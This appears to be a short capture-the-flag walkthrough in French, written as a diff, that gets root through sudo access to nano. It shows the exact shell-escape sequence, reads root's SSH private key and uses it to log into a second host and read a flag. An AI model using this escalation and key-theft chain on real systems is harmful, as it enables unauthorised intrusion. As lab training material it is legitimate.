@@ -1,0 +1,15 @@
+connextion en ssh
+
+sudo -l
+On voit que l'on a accès à nano en sudo user
+sudo nano
+CTRL R et CTRL X
+reset; sh 1>&0 2>&0
+
+On est maintenant root
+en regardant, on a accès à /root/.ssh
+On voit également que dans /etc/hosts on a l'ip du satellite
+ensuite on fait ssh -i /root/.ssh/id_rsa satellite@satellite 
+cat flag.txt
+
+
